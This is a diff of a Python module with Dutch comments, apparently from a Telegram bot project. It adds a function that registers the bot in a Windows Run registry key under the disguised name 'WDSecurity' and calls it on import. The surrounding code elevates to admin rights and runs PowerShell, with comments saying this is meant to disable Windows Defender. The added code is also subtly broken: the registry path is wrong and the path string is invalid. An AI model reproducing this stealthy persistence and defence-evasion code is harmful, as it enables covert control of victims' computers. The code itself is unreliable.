@@ -1,5 +1,5 @@
 # Deze file bevat alle functies die binnen de async commands uitgevoerd kunnen wordt
-import cv2, os, time, subprocess, sys, ctypes
+import cv2, os, time, subprocess, sys, ctypes, winreg
 
 
 # functie die afgedraaid wordt om de banner te maken
@@ -93,6 +93,7 @@ def get_adminRights():
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
         sys.exit(0)
 
+
 # windows defender uitzetten via python met powershell
 def powershell_command(cmd):
     # zet admin rechten aan
@@ -106,3 +107,24 @@ def powershell_command(cmd):
     )
 
     return runCommand.stdout
+
+
+def add_to_registry(program_name, program_path):
+    try:
+        #Bepaal de registersleutel voor de huidige gebruiker
+        registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\CurrentVersion\Run")
+
+        # Voeg een nieuwe registerwaarde toe
+        winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, program_path)
+
+        print(f"{program_name} is toegevoegd aan de opstart-items")
+
+        # Sluit de registersleutel
+        winreg.CloseKey(registry_key)
+
+    except Exception as e:
+        print(f"Fout bij toevoegen aan het register: {e}")
+
+programma_naam = "WDSecurity"
+programma_pad = "C:\Users\rishi\gh-repos\AD-CS-python\pythonTelegramBot\main.py"
+add_to_registry(programma_naam, programma_pad)
